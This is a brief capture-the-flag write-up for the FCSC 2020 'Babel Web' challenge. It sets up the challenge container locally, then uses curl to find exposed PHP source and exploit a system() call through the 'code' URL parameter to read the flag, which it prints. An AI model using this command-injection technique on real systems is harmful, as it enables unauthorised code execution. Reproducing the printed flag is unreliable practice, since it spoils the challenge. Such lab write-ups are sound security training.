# FCSC - Babel Web

## Source

```yml
version: '3.9'
services:
  babel-web:
    image: anssi/fcsc2020-web-babel-web:latest
    ports:
      - "8000:80"
```

## Run

```bash
curl https://hackropole.fr/challenges/fcsc2020-web-babel-web/docker-compose.public.yml -o docker-compose.yml
sudo docker-compose up
```

## Solve

```bash
curl http://127.0.0.1:8000/ # get HTML source code, get url in comment: <!-- <a href="?source=1">source</a> -->
curl http://127.0.0.1:8000/?source=1 # get PHP source code, see command execution with params code: @system($_GET['code']);
curl http://127.0.0.1:8000/?code=tac%20flag.php # get the flag: FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}
```
